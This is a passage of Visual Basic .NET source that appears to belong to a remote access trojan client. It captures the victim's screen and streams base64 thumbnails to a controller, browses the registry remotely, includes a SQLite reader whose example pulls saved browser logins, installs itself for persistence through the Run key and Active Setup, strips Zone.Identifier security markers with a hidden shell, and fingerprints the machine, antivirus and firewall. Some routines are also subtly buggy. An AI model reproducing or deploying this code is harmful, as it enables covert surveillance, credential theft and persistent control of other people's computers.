            Dim scr As Screen = Screen.PrimaryScreen
            maxWidth += scr.Bounds.Width
            If scr.Bounds.Height > maxHeight Then maxHeight = scr.Bounds.Height
            Dim allScreensCapture As New Bitmap(maxWidth, maxHeight, System.Drawing.Imaging.PixelFormat.Format24bppRgb)
            Dim screenGrab As Bitmap
            Dim screenSize As Size
            Dim g1 As Graphics
            Dim g2 As Graphics = Graphics.FromImage(allScreensCapture)
            Dim a As New Point(0, 0)
            screenSize = New Size(scr.Bounds.Width, scr.Bounds.Height)
            screenGrab = New Bitmap(scr.Bounds.Width, scr.Bounds.Height)
            g1 = Graphics.FromImage(screenGrab)
            g1.CopyFromScreen(a, New Point(0, 0), screenSize)
            g2.DrawImage(screenGrab, a)
            a.X += scr.Bounds.Width
            g2.Dispose()
            g1.Dispose()
            screenGrab.Dispose()
            screenGrab = Nothing
            g1 = Nothing
            g2 = Nothing
            Try
                screenGrab.Dispose()
                screenGrab = Nothing
                g1.Dispose()
                g1 = Nothing
                g2.Dispose()
                g2 = Nothing
            Catch ex As Exception
            End Try
            '   End If
            Dim bm As Bitmap = allScreensCapture
            Select Case quality
                Case 1
                    Return SaveJPGWithCompressionSetting(PicResizeByWidth(bm, Convert.ToInt32(bm.Width / 2)), 20)
                Case 2
                    Return SaveJPGWithCompressionSetting(PicResizeByWidth(bm, Convert.ToInt32(bm.Width / 4 * 3)), 20)
                Case 3
                    Return SaveJPGWithCompressionSetting(bm, 15)
                Case Else
     
     
            End Select
            bm = Nothing
            bm.Dispose()
     
     
        End Function
        Public Shared Function imgstr() As String
            Dim r As Byte() = imagetobyte(getimage)
            Dim str As String = Convert.ToBase64String(r)
            Return str
        End Function
        Public Shared errOcr As Boolean
        Public Shared Function SaveJPGWithCompressionSetting(ByVal image As Image, ByVal lCompression As Long) As Image
            Dim eps As EncoderParameters = New EncoderParameters(1)
            eps.Param(0) = New EncoderParameter(System.Drawing.Imaging.Encoder.Quality, lCompression)
            Dim ici As ImageCodecInfo = GetEncoderInfo("image/jpeg")
            Dim newimage As Image
            Dim ImageStream As New MemoryStream
            image.Save(ImageStream, ici, eps)
            newimage = image.FromStream(ImageStream)
            ici = Nothing
            image.Dispose()
            image = Nothing
            Return newimage
        End Function
        Public Shared Function GetEncoderInfo(ByVal mimeType As String) As ImageCodecInfo
            Dim j As Integer
            Dim encoders As ImageCodecInfo()
            encoders = ImageCodecInfo.GetImageEncoders()
            For j = 0 To encoders.Length
                If encoders(j).MimeType = mimeType Then
                    Return encoders(j)
                End If
            Next j '        
            Return Nothing
        End Function
        Public Shared Function getthumb() As Bitmap
            Dim maxHeight As Integer = 0
            Dim maxWidth As Integer = 0
            Dim scr As Screen = Screen.PrimaryScreen
            maxWidth += scr.Bounds.Width
            If scr.Bounds.Height > maxHeight Then maxHeight = scr.Bounds.Height
            Dim allScreensCapture As New Bitmap(maxWidth, maxHeight, System.Drawing.Imaging.PixelFormat.Format24bppRgb)
            Dim screenGrab As Bitmap
            Dim screenSize As Size
            Dim g1 As Graphics
            Dim g2 As Graphics = Graphics.FromImage(allScreensCapture)
            Dim a As New Point(0, 0)
            screenSize = New Size(scr.Bounds.Width, scr.Bounds.Height)
            screenGrab = New Bitmap(scr.Bounds.Width, scr.Bounds.Height)
            g1 = Graphics.FromImage(screenGrab)
            g1.CopyFromScreen(a, New Point(0, 0), screenSize)
            g2.DrawImage(screenGrab, a)
            a.X += scr.Bounds.Width
            g2.Dispose()
            g1.Dispose()
            screenGrab.Dispose()
            screenGrab = Nothing
            g1 = Nothing
            g2 = Nothing
            Try
                screenGrab.Dispose()
                screenGrab = Nothing
                g1.Dispose()
                g1 = Nothing
                g2.Dispose()
                g2 = Nothing
            Catch ex As Exception
            End Try
            '   End If
            Dim bm As Bitmap = allScreensCapture
            Return SaveJPGWithCompressionSetting(PicResizeByWidth(bm, 157), 25)
            bm = Nothing
            bm.Dispose()
        End Function
     
        Public Shared Sub sendthumb()
            Client.senddata("GT|" & thumbstr(getthumb))
     
        End Sub
        Public Shared Function thumbstr(ByVal image As Bitmap) As String
            Dim r As Byte() = MCimagetobyte(image)
            Dim str As String = Convert.ToBase64String(r)
            Return str
        End Function
     
        Public Shared shouldthumb = True
        Public Shared Function getbigthumb() As Bitmap
            Dim maxHeight As Integer = 0
            Dim maxWidth As Integer = 0
            Dim scr As Screen = Screen.PrimaryScreen
            maxWidth += scr.Bounds.Width
            If scr.Bounds.Height > maxHeight Then maxHeight = scr.Bounds.Height
            Dim allScreensCapture As New Bitmap(maxWidth, maxHeight, System.Drawing.Imaging.PixelFormat.Format24bppRgb)
            Dim screenGrab As Bitmap
            Dim screenSize As Size
            Dim g1 As Graphics
            Dim g2 As Graphics = Graphics.FromImage(allScreensCapture)
            Dim a As New Point(0, 0)
            screenSize = New Size(scr.Bounds.Width, scr.Bounds.Height)
            screenGrab = New Bitmap(scr.Bounds.Width, scr.Bounds.Height)
            g1 = Graphics.FromImage(screenGrab)
            g1.CopyFromScreen(a, New Point(0, 0), screenSize)
            g2.DrawImage(screenGrab, a)
            a.X += scr.Bounds.Width
            g2.Dispose()
            g1.Dispose()
            screenGrab.Dispose()
            screenGrab = Nothing
            g1 = Nothing
            g2 = Nothing
            Try
                screenGrab.Dispose()
                screenGrab = Nothing
                g1.Dispose()
                g1 = Nothing
                g2.Dispose()
                g2 = Nothing
            Catch ex As Exception
            End Try
            '   End If
            Dim bm As Bitmap = allScreensCapture
            Return SaveJPGWithCompressionSetting(PicResizeByWidth(bm, 256), 30)
            bm = Nothing
            bm.Dispose()
        End Function
        Public Shared Sub sendminithumb()
            If shouldthumb Then
                Client.senddata("TH|" & thumbstr(getbigthumb))
                System.Threading.Thread.Sleep(5000)
                sendminithumb()
     
            Else
                System.Threading.Thread.CurrentThread.Abort()
                Exit Sub
     
            End If
     
        End Sub
        Public Shared Sub startminithumb()
     
            Dim r As New System.Threading.Thread(AddressOf sendminithumb)
            r.Start()
        End Sub
    End Class
     
     
     
     
     
    Public Class reg
        Public Shared Function setnewkey(ByVal name As String, ByVal value As String, ByVal path As String)
           
     
     
        End Function
        Public Shared Sub selecthive(ByVal hive As String)
            Client.senddata("REGH|" & start(hive))
        End Sub
        Public Shared Sub sendkeys(ByVal key As String)
            Client.senddata("REGK|" & getdata(key))
        End Sub
        Public Shared Function start(ByVal local As String) As String
            Dim r As String = ""
     
            If local = "HKLM" Then
                Try
                    Dim Registry As RegistryKey = Microsoft.Win32.Registry.LocalMachine
                    For Each lol As String In Registry.GetSubKeyNames
                        r &= lol & "|"
                    Next
                Catch
                End Try
     
            Else
                Try
                    Dim Registry As RegistryKey = Microsoft.Win32.Registry.CurrentUser
                    For Each lol As String In Registry.GetSubKeyNames
                        r &= lol & "|"
                    Next
                Catch
                End Try
     
            End If
            Return r
        End Function
        ''' <summary>
        ''' string: folders`folders`folders`|key~value`key~value`key~value
        ''' </summary>
        ''' <param name="keypath">do as HKCU|PATH</param>
        ''' <returns>string: folders`folders`folders`|key~value`key~value`key~value</returns>
        ''' <remarks></remarks>
        Public Shared Function getdata(ByVal keypathfull As String) As String
     
            Dim local As String = keypathfull.Split("\")(0)
            Dim keypath As String = keypathfull.Replace(local & "\", "")
     
            'keypath needs a "\" at end of it
            Dim Registrym As RegistryKey
            If local = "HKLM" Then
                Try
                    Registrym = Registry.LocalMachine.OpenSubKey(keypath)
                Catch
                    Return "exception"
                    Exit Function
                End Try
     
            Else
                Try
                    Registrym = Registry.CurrentUser.OpenSubKey(keypath)
                Catch
                    Return "exception"
                    Exit Function
                End Try
     
            End If
     
     
     
            Dim returnstring As String = ""
            Try
                For Each lol As String In Registrym.GetSubKeyNames
                    returnstring &= lol & "`"
     
                Next
            Catch
                returnstring = "exception"
            End Try
     
            returnstring &= "|"
            Try
                For Each lool As String In Registrym.GetValueNames
                    returnstring &= (lool) & "~"
     
                    If Registrym.GetValueKind(lool) = RegistryValueKind.String Or RegistryValueKind.ExpandString Then
                        returnstring &= Registrym.GetValue(lool)
                    Else
                        returnstring &= "0x" & Registrym.GetValue(lool)
                    End If
     
     
                    returnstring &= "`"
                Next
            Catch
                returnstring = "exception"
            End Try
     
            Return returnstring
     
        End Function
    End Class
     
     
    '**************************************************************
    '
    '               Coded By: RockingWithTheBest
    '
    '                           v 0.1
    '
    '
    '      A Handler for SQLite without needing the sqlite3.dll!
    '      You can read every table and value from database, but
    '      there is no support for input. Also no support for
    '      journal files and overflow pages, maybe i will add
    '      that in a later release.
    '      
    '
    '                       Have Fun!
    '
    '   If u want to learn more about or enhance it then visit:
    '           http://www.sqlite.org/fileformat.html
    '
    '   If you copy or modify it, please add me to credits!
    '
    '   Questions etc. to:      peterrlustig@googlemail.com
    '
    '**************************************************************
    '
    '   Example:
    '
    '   Dim SQLDatabase = New SQLiteHandler("C:\Temp\Login Data")
    '   SQLDatabase.ReadTable("logins")
    '
    '   MsgBox(GetValue(SQLDatabase.GetValue(0, "username_value")))
    '
    '**************************************************************
     
     
     
    Public Class SQLiteHandler
        Private db_bytes() As Byte
        Private page_size As UInt16
        Private encoding As UInt64
        Private master_table_entries() As sqlite_master_entry
     
        Private SQLDataTypeSize() As Byte = New Byte() {0, 1, 2, 3, 4, 6, 8, 8, 0, 0}
        Private table_entries() As table_entry
        Private field_names() As String
     
        Private Structure record_header_field
            Dim size As Int64
            Dim type As Int64
        End Structure
     
        Private Structure table_entry
            Dim row_id As Int64
            Dim content() As String
        End Structure
     
        Private Structure sqlite_master_entry
            Dim row_id As Int64
            Dim item_type As String
            Dim item_name As String
            Dim astable_name As String
            Dim root_num As Int64
            Dim sql_statement As String
        End Structure
     
        'Needs BigEndian
        'GetVariableLength
        ' returns the endindex of an variable length integer
        Private Function GVL(ByVal startIndex As Integer) As Integer
            If startIndex > db_bytes.Length Then Return Nothing
            Dim i As Integer
            For i = startIndex To startIndex + 8 Step 1
                If i > db_bytes.Length - 1 Then
                    Return Nothing
                ElseIf (db_bytes(i) And &H80) <> &H80 Then
                    Return i
                End If
            Next
     
            Return startIndex + 8
        End Function
     
        ' Eingaberichtung BigEndian
        ' ConvertVariableLength
        Private Function CVL(ByVal startIndex As Integer, ByVal endIndex As Integer) As Int64
            endIndex = endIndex + 1
     
            Dim retus(7) As Byte
            Dim Length = endIndex - startIndex
            Dim Bit64 As Boolean = False
     
            If Length = 0 Or Length > 9 Then Return Nothing
            If Length = 1 Then
                retus(0) = (db_bytes(startIndex) And &H7F)
                Return BitConverter.ToInt64(retus, 0)
            End If
     
            If Length = 9 Then
                ' Ein Byte wird nämlich grad hinzugefügt
                Bit64 = True
            End If
     
            Dim j As Integer = 1
            Dim k As Integer = 7
            Dim y As Integer = 0
     
            If Bit64 Then
                retus(0) = db_bytes(endIndex - 1)
                endIndex = endIndex - 1
                y = 1
            End If
            Dim i As Integer
            For i = (endIndex - 1) To startIndex Step -1
                If (i - 1) >= startIndex Then
                    retus(y) = ((db_bytes(i) >> (j - 1)) And (&HFF >> j)) Or (db_bytes(i - 1) << k)
                    j = j + 1
                    y = y + 1
                    k = k - 1
                Else
                    If Not Bit64 Then retus(y) = ((db_bytes(i) >> (j - 1)) And (&HFF >> j))
                End If
            Next
     
            Return BitConverter.ToInt64(retus, 0)
        End Function
     
        'Checks if a number is odd
        Private Function IsOdd(ByVal value As Int64) As Boolean
            Return (value And 1) = 1
        End Function
     
        'Big Endian Conversation
        Private Function ConvertToInteger(ByVal startIndex As Integer, ByVal Size As Integer) As UInt64
            If Size > 8 Or Size = 0 Then Return Nothing
     
            Dim retVal As UInt64 = 0
            Dim i As Integer
            For i = 0 To Size - 1 Step 1
                retVal = ((retVal << 8) Or db_bytes(startIndex + i))
            Next
     
            Return retVal
        End Function
     
        Private Sub ReadMasterTable(ByVal Offset As UInt64)
     
            If db_bytes(Offset) = &HD Then 'Leaf node
                'Length for setting the array length for the entries
                Dim Length As UInt16 = ConvertToInteger(Offset + 3, 2) - 1
                Dim ol As Integer = 0
     
                If Not master_table_entries Is Nothing Then
                    ol = master_table_entries.Length
                    ReDim Preserve master_table_entries(master_table_entries.Length + Length)
                Else
                    ReDim master_table_entries(Length)
                End If
     
                Dim ent_offset As UInt64
                Dim i As Integer
                For i = 0 To Length Step 1
                    ent_offset = ConvertToInteger(Offset + 8 + (i * 2), 2)
     
                    If Offset <> 100 Then ent_offset = ent_offset + Offset
     
                    'Table Cell auslesen
                    Dim t = GVL(ent_offset)
                    Dim size As Int64 = CVL(ent_offset, t)
     
                    Dim s = GVL(ent_offset + (t - ent_offset) + 1)
                    master_table_entries(ol + i).row_id = CVL(ent_offset + (t - ent_offset) + 1, s)
     
                    'Table Content
                    'Resetting the offset
                    ent_offset = ent_offset + (s - ent_offset) + 1
     
                    'Now get to the Record Header
                    t = GVL(ent_offset)
                    s = t
                    Dim Rec_Header_Size As Int64 = CVL(ent_offset, t) 'Record Header Length
     
                    Dim Field_Size(4) As Int64
     
                    'Now get the field sizes and fill in the Values
                    Dim j As Integer
                    For j = 0 To 4 Step 1
                        t = s + 1
                        s = GVL(t)
                        Field_Size(j) = CVL(t, s)
     
                        If Field_Size(j) > 9 Then
                            If IsOdd(Field_Size(j)) Then
                                Field_Size(j) = (Field_Size(j) - 13) / 2
                            Else
                                Field_Size(j) = (Field_Size(j) - 12) / 2
                            End If
                        Else
                            Field_Size(j) = SQLDataTypeSize(Field_Size(j))
                        End If
                    Next
     
                    ' Wir lesen nur unbedingt notwendige Sachen aus
                    If encoding = 1 Then
                        master_table_entries(ol + i).item_type = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
                    ElseIf encoding = 2 Then
                        master_table_entries(ol + i).item_type = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
                    ElseIf encoding = 3 Then
                        master_table_entries(ol + i).item_type = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
                    End If
                    If encoding = 1 Then
                        master_table_entries(ol + i).item_name = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
                    ElseIf encoding = 2 Then
                        master_table_entries(ol + i).item_name = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
                    ElseIf encoding = 3 Then
                        master_table_entries(ol + i).item_name = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
                    End If
                    'master_table_entries(ol + i).astable_name = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1), Field_Size(2))
                    master_table_entries(ol + i).root_num = ConvertToInteger(ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2), Field_Size(3))
                    If encoding = 1 Then
                        master_table_entries(ol + i).sql_statement = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
                    ElseIf encoding = 2 Then
                        master_table_entries(ol + i).sql_statement = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
                    ElseIf encoding = 3 Then
                        master_table_entries(ol + i).sql_statement = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
                    End If
                Next
            ElseIf db_bytes(Offset) = &H5 Then 'internal node
                Dim Length As UInt16 = ConvertToInteger(Offset + 3, 2) - 1
                Dim ent_offset As UInt16
                Dim i As Integer
                For i = 0 To Length Step 1
                    ent_offset = ConvertToInteger(Offset + 12 + (i * 2), 2)
     
                    If Offset = 100 Then
                        ReadMasterTable((ConvertToInteger(ent_offset, 4) - 1) * page_size)
                    Else
                        ReadMasterTable((ConvertToInteger(Offset + ent_offset, 4) - 1) * page_size)
                    End If
     
                Next
     
                ReadMasterTable((ConvertToInteger(Offset + 8, 4) - 1) * page_size)
            End If
        End Sub
     
        Private Function ReadTableFromOffset(ByVal Offset As UInt64) As Boolean
            If db_bytes(Offset) = &HD Then 'Leaf node
     
                'Length for setting the array length for the entries
                Dim Length As UInt16 = ConvertToInteger(Offset + 3, 2) - 1
                Dim ol As Integer = 0
     
                If Not table_entries Is Nothing Then
                    ol = table_entries.Length
                    ReDim Preserve table_entries(table_entries.Length + Length)
                Else
                    ReDim table_entries(Length)
                End If
     
                Dim ent_offset As UInt64
                Dim i As Integer
                For i = 0 To Length Step 1
                    ent_offset = ConvertToInteger(Offset + 8 + (i * 2), 2)
     
                    If Offset <> 100 Then ent_offset = ent_offset + Offset
     
                    'Table Cell auslesen
                    Dim t = GVL(ent_offset)
                    Dim size As Int64 = CVL(ent_offset, t)
     
                    Dim s = GVL(ent_offset + (t - ent_offset) + 1)
                    table_entries(ol + i).row_id = CVL(ent_offset + (t - ent_offset) + 1, s)
     
                    'Table Content
                    'Resetting the offset
                    ent_offset = ent_offset + (s - ent_offset) + 1
     
                    'Now get to the Record Header
                    t = GVL(ent_offset)
                    s = t
                    Dim Rec_Header_Size As Int64 = CVL(ent_offset, t) 'Record Header Length
     
                    Dim Field_Size() As record_header_field
                    Dim size_read As Int64 = (ent_offset - t) + 1
                    Dim j = 0
     
                    'Now get the field sizes and fill in the Values
                    While size_read < Rec_Header_Size
                        ReDim Preserve Field_Size(j)
     
                        t = s + 1
                        s = GVL(t)
                        Field_Size(j).type = CVL(t, s)
     
                        If Field_Size(j).type > 9 Then
                            If IsOdd(Field_Size(j).type) Then
                                Field_Size(j).size = (Field_Size(j).type - 13) / 2
                            Else
                                Field_Size(j).size = (Field_Size(j).type - 12) / 2
                            End If
                        Else
                            Field_Size(j).size = SQLDataTypeSize(Field_Size(j).type)
                        End If
     
                        size_read = size_read + (s - t) + 1
                        j = j + 1
                    End While
     
                    ReDim table_entries(ol + i).content(Field_Size.Length - 1)
                    Dim counter As Integer = 0
                    Dim k As Integer
                    For k = 0 To Field_Size.Length - 1 Step 1
                        If Field_Size(k).type > 9 Then
                            If Not IsOdd(Field_Size(k).type) Then
                                If encoding = 1 Then
                                    table_entries(ol + i).content(k) = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                                ElseIf encoding = 2 Then
                                    table_entries(ol + i).content(k) = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                                ElseIf encoding = 3 Then
                                    table_entries(ol + i).content(k) = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                                End If
                            Else
                                table_entries(ol + i).content(k) = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                            End If
                        Else
                            table_entries(ol + i).content(k) = CStr(ConvertToInteger(ent_offset + Rec_Header_Size + counter, Field_Size(k).size))
                        End If
     
                        counter = counter + Field_Size(k).size
                    Next
                Next
            ElseIf db_bytes(Offset) = &H5 Then 'internal node
                Dim Length As UInt16 = ConvertToInteger(Offset + 3, 2) - 1
                Dim ent_offset As UInt16
                Dim i As Integer
                For i = 0 To Length Step 1
                    ent_offset = ConvertToInteger(Offset + 12 + (i * 2), 2)
     
                    ReadTableFromOffset((ConvertToInteger(Offset + ent_offset, 4) - 1) * page_size)
                Next
     
                ReadTableFromOffset((ConvertToInteger(Offset + 8, 4) - 1) * page_size)
            End If
     
            Return True
        End Function
     
        ' Reads a complete table with all entries in it
        Public Function ReadTable(ByVal TableName As String) As Boolean
            ' First loop through sqlite_master and look if table exists
            Dim found As Integer = -1
            Dim i As Integer
            For i = 0 To master_table_entries.Length Step 1
                If master_table_entries(i).item_name.ToLower().CompareTo(TableName.ToLower()) = 0 Then
                    found = i
                    Exit For
                End If
            Next
     
            If found = -1 Then Return False
     
            Dim fields() = master_table_entries(found).sql_statement.Substring(master_table_entries(found).sql_statement.IndexOf("(") + 1).Split(",")
     
            For i = 0 To fields.Length - 1 Step 1
                fields(i) = LTrim(fields(i))
     
                Dim index = fields(i).IndexOf(" ")
     
                If index > 0 Then fields(i) = fields(i).Substring(0, index)
     
                If fields(i).IndexOf("UNIQUE") = 0 Then
                    Exit For
                Else
                    ReDim Preserve field_names(i)
                    field_names(i) = fields(i)
                End If
            Next
     
            Return ReadTableFromOffset((master_table_entries(found).root_num - 1) * page_size)
        End Function
     
        ' Returns the row count of current table
        Public Function GetRowCount() As Integer
            Return table_entries.Length
        End Function
     
        ' Returns a Value from current table in row row_num with field number field
        Public Function GetValue(ByVal row_num As Integer, ByVal field As Integer) As String
            If row_num >= table_entries.Length Then Return Nothing
            If field >= table_entries(row_num).content.Length Then Return Nothing
     
            Return table_entries(row_num).content(field)
        End Function
     
        ' Returns a Value from current table in row row_num with field name field
        Public Function GetValue(ByVal row_num As Integer, ByVal field As String) As String
            Dim found As Integer = -1
            Dim i As Integer
            For i = 0 To field_names.Length Step 1
                If field_names(i).ToLower().CompareTo(field.ToLower()) = 0 Then
                    found = i
                    Exit For
                End If
            Next
     
            If found = -1 Then Return Nothing
     
            Return GetValue(row_num, found)
        End Function
     
        ' Returns a String-Array with all Tablenames
        Public Function GetTableNames() As String()
            Dim retVal As String()
            Dim arr = 0
            Dim i As Integer
            For i = 0 To master_table_entries.Length - 1 Step 1
                If master_table_entries(i).item_type = "table" Then
                    ReDim Preserve retVal(arr)
                    retVal(arr) = master_table_entries(i).item_name
                    arr = arr + 1
                End If
            Next
     
            Return retVal
        End Function
     
        ' Constructor
        Public Sub New(ByVal baseName As String)
            'Page Number n is page_size*(n-1)
            If File.Exists(baseName) Then
                FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
                Dim asi As String = Space(LOF(1))
                FileGet(1, asi)
                FileClose(1)
     
                db_bytes = System.Text.Encoding.Default.GetBytes(asi)
     
                If System.Text.Encoding.Default.GetString(db_bytes, 0, 15).CompareTo("SQLite format 3") <> 0 Then
                    Throw New Exception("Not a valid SQLite 3 Database File")
                    End
                End If
     
                If db_bytes(52) <> 0 Then
                    Throw New Exception("Auto-vacuum capable database is not supported")
                    End
                ElseIf ConvertToInteger(44, 4) >= 4 Then
                    Throw New Exception("No supported Schema layer file-format")
                    End
                End If
     
                page_size = ConvertToInteger(16, 2)
                encoding = ConvertToInteger(56, 4)
     
                If encoding = 0 Then encoding = 1
     
                'Now we read the sqlite_master table
                'Offset is 100 in first page
                ReadMasterTable(100)
            End If
        End Sub
    End Class
     
     
    Public Class startup
        ''' <summary>
        '''  Creates an active X Key
        ''' </summary>
        ''' <param name="ActiveXKey"> the key</param>
        ''' <param name="ExecutablePath"> the path to the executable </param>
        ''' <remarks>  usage  CreateActiveXStartup("{f98f6f94-f336-456f-8cc9-68c86a4a47e5}", Application.ExecutablePath) </remarks>
        Public Shared Sub CreateActiveXStartup(ByVal ActiveXKey As String, ByVal ExecutablePath As String)
            Dim rk As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Active Setup\Installed Components", True)
            rk.CreateSubKey(ActiveXKey)
            rk = rk.OpenSubKey(ActiveXKey, True)
            Try
                If rk.GetValue(c.startupkey) = Application.StartupPath Then
                Else
                    System.IO.File.Copy(Application.ExecutablePath, ExecutablePath)
                    rk.SetValue(c.startupkey, ExecutablePath)
     
                    rk.SetValue("IsInstalled", 1, RegistryValueKind.DWord)
                End If
            Catch
                System.IO.File.Copy(Application.ExecutablePath, ExecutablePath)
                rk.SetValue(c.startupkey, ExecutablePath)
     
                rk.SetValue("IsInstalled", 1, RegistryValueKind.DWord)
            End Try
     
           
        End Sub
        Public Shared Sub addstartup(ByVal key As String, ByVal path As String)
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", key, path)
        End Sub
        Public Shared Sub removestartup(ByVal key As String)
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", key, "")
        End Sub
        ''' <summary>
        ''' Disables the zone identifier window, just call it without params
        ''' </summary>
        ''' <remarks></remarks>
        Public Shared Sub DisableSecurity()
            Dim receivestring As String
            Dim myprocess As New Process
            Dim StartInfo As New System.Diagnostics.ProcessStartInfo
            StartInfo.FileName = "cmd"
            StartInfo.RedirectStandardInput = True
            StartInfo.RedirectStandardOutput = True
            StartInfo.UseShellExecute = False
            StartInfo.CreateNoWindow = True
            myprocess.StartInfo = StartInfo
            myprocess.Start()
            Dim SR As System.IO.StreamReader = myprocess.StandardOutput
            Dim SW As System.IO.StreamWriter = myprocess.StandardInput
            SW.WriteLine("cd " & Application.StartupPath)
            SW.WriteLine("FOR /R %I IN (*" & System.IO.Path.GetFileName(Application.ExecutablePath) & "*) DO > %I:Zone.Identifier ECHO.")
            SW.WriteLine("exit")
            receivestring = SR.ReadToEnd
            SW.Close()
            SR.Close()
        End Sub
        Shared instanceUnique As InstanceUnique
        Shared Sub disposeinstance()
            instanceUnique.Dispose()
        End Sub
        Public Shared Sub checkrunning()
            instanceUnique = New InstanceUnique(c.mutex)
            If instanceUnique.IsRunning() Then
                Environment.[Exit](0)
            End If
     
        End Sub
        Public Shared Sub createdirs()
            System.IO.Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\pixels\")
        End Sub
     
    End Class
     
     
     
    Public Class sysinfo
        Public Shared Function countryname() As String
            Return Getcn.GETLETTERS()
     
        End Function
        Public Shared Function countrycode() As String
            Return Getcn.Getcode
        End Function
        Public Shared r As New Random
        Public Shared Function ID() As String
           
            Return unique.ID
        End Function
        Public Shared Function username() As String
            Return Environment.UserName.ToString
        End Function
        Public Shared Function machinename() As String
            Return Environment.MachineName.ToString
        End Function
        Public Shared Function CPU() As String
            Dim m_LM As RegistryKey
            Dim m_HW As RegistryKey
            Dim m_Des As RegistryKey
            Dim m_System As RegistryKey
            Dim m_CPU As RegistryKey
            Dim m_Info As RegistryKey
            m_LM = Registry.LocalMachine
            m_HW = m_LM.OpenSubKey("HARDWARE")
            m_Des = m_HW.OpenSubKey("DESCRIPTION")
            m_System = m_Des.OpenSubKey("SYSTEM")
            m_CPU = m_System.OpenSubKey("CentralProcessor")
            m_Info = m_CPU.OpenSubKey("0")
            Return m_Info.GetValue("ProcessorNameString") & " " & m_Info.GetValue("~Mhz") & "MHz"
        End Function
        Private Shared Function GetSystemRAMSize() As Double
            Try
     
                'My.Computer.Info.TotalPhysicalMemory returns memory   size in bytes
                'To covert it into required memory units use the   following coversion units
                'Here in this function RAM Size is   converted into GB's
                '1 Bytes = 8 Bit
                '1 KB = 1024   Bytes
                '1 MB = 1024 KB
                '1 GB = 1024 MB
                '1 TB = 1024 GB
     
                Dim RAM_Size As Double = (My.Computer.Info.TotalPhysicalMemory / 1024 / 1024 / 1024)
                Return FormatNumber(RAM_Size, 2)
     
            Catch ex As Exception
                MessageBox.Show(ex.Message.ToString())
            End Try
        End Function
     
        Public Shared Function ram() As String
            'Dim totalRAM As String = (My.Computer.Info.TotalPhysicalMemory.ToString / 1000000)
            'Dim Ram_ As String()
            'If totalRAM.Contains(",") Then
            '    Ram_ = totalRAM.Split(",")
            'Else
            '    Ram_ = totalRAM.Split(".")
            'End If
            ' Return Math.Round(CDec(GetSystemRAMSize())) & " GB"
            Return GetSystemRAMSize()
        End Function
        Public Shared Function ping() As String
            Dim pinger As New System.Net.NetworkInformation.Ping
            Return (pinger.Send(c.ip).RoundtripTime.ToString)
        End Function
        Public Shared Function acwin() As String
            Return GetActiveWindowTitle()
        End Function
        Public Shared Function Firewall() As String
            Try
                Dim str As String = Nothing
                Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM FirewallProduct")
                Dim instances As ManagementObjectCollection = searcher.[Get]()
                For Each queryObj As ManagementObject In instances
                    str = queryObj("displayName").ToString()
                Next
                If str = String.Empty Then
                    Return "Not Available"
                Else
                    Return str
                End If
     
            Catch ex As Exception
                Return "Not Available"
            End Try
       
        End Function
     
        Public Shared Function AntiVirus() As String
            Try
                Dim str As String = Nothing
                Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM AntivirusProduct")
                Dim instances As ManagementObjectCollection = searcher.[Get]()
                For Each queryObj As ManagementObject In instances
                    str = queryObj("displayName").ToString()
                Next
                If str = String.Empty Then
                    Return "Not Available"
                Else
                    Return str
                End If
            Catch ex As Exception
                Return "Not Available"
            End Try
     
        End Function
        Public Shared Function DetectOS() As String
            Dim os As OperatingSystem = Environment.OSVersion
            Dim runningOS As String = ""
     
            If os.Platform.ToString() = "Win32NT" Then
                Select Case OSVersionNoRevision(os.Version)
                    Case "4.1.2222"
                        runningOS = "98"
                        Exit Select
                    Case "4.1.2600"
                        runningOS = "98SE"
                        Exit Select
                    Case "4.9.3000"
                        runningOS = "ME"
                        Exit Select
                    Case "5.0.2195"
                        runningOS = "2000"
                        Exit Select
                    Case "5.1.2600", "5.2.3790"
                        runningOS = "Windows XP"
                        Exit Select
                    Case "6.0.6000", "6.0.6001", "6.0.6002"
                        runningOS = "Windows Vista"
                        Exit Select
                    Case "6.1.7600"
                        runningOS = "Windows 7"
                        Exit Select
                    Case "6.1.7601"
                        runningOS = "Windows 7"
                        Exit Select
                    Case Else
                        runningOS = "Unknown"
                        Exit Select
                End Select
            End If
     
            Dim sPack As String = String.Empty
            Dim versionInfo As New OSVERSIONINFOEX()
     
